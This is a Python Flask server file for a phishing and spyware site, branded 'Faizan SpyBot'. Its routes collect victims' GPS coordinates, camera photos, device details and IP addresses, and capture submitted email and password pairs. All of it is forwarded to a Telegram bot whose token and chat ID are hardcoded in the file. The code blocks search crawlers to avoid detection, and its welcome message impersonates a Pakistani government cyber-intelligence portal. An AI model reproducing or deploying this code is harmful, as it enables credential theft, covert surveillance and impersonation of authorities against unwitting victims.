# main.py
from flask import Flask, request, render_template, redirect
import telegram
import os
from werkzeug.utils import secure_filename

app = Flask(__name__)

BOT_TOKEN = '7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg'
CHAT_ID = '6908281054'
bot = telegram.Bot(token=BOT_TOKEN)
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.before_request
def block_bots():
    bot_signatures = ['bot', 'crawl', 'spider', 'google', 'yandex', 'bingpreview']
    ua = request.headers.get('User-Agent', '').lower()
    if any(bot in ua for bot in bot_signatures):
        return "Access Denied (Bot Detected)", 403

@app.route('/')
def index():
    return render_template('spy.html')

@app.route('/collect', methods=['POST'])
def collect():
    ip = request.remote_addr
    if request.content_type.startswith('multipart/form-data'):
        photo = request.files.get('photo')
        if photo:
            filename = secure_filename(photo.filename)
            path = os.path.join(UPLOAD_FOLDER, filename)
            photo.save(path)
            bot.send_photo(chat_id=CHAT_ID, photo=open(path, 'rb'))
    else:
        data = request.get_json()
        msg = f"\n🕵️‍♂️ SpyBot Alert\n\n📍 Location: {data.get('latitude')}, {data.get('longitude')}\n📷 Camera: {data.get('camera')}\n🧠 Device: {data.get('deviceInfo')}\n🌐 IP Address: {ip}\n🌐 UserAgent: {data.get('userAgent')}"
        bot.send_message(chat_id=CHAT_ID, text=msg)
    return 'OK'

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    ip = request.remote_addr
    msg = f"\n📥 New Login Captured:\n📧 Email: {email}\n🔑 Password: {password}\n🌐 IP Address: {ip}"
    bot.send_message(chat_id=CHAT_ID, text=msg)
    return redirect('/')

@app.route('/start', methods=['POST', 'GET'])
def start():
    text = "\U0001F44B Welcome to Faizan\u2122 SpyBot!\n\n\u26A0\uFE0F Government of Pakistan – Cyber Intelligence\n\n\U0001F517 Live Monitoring Portal:\nhttps://govt-of-punjab-pak.onrender.com"
    bot.send_message(chat_id=CHAT_ID, text=text)
    return 'Welcome message sent'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
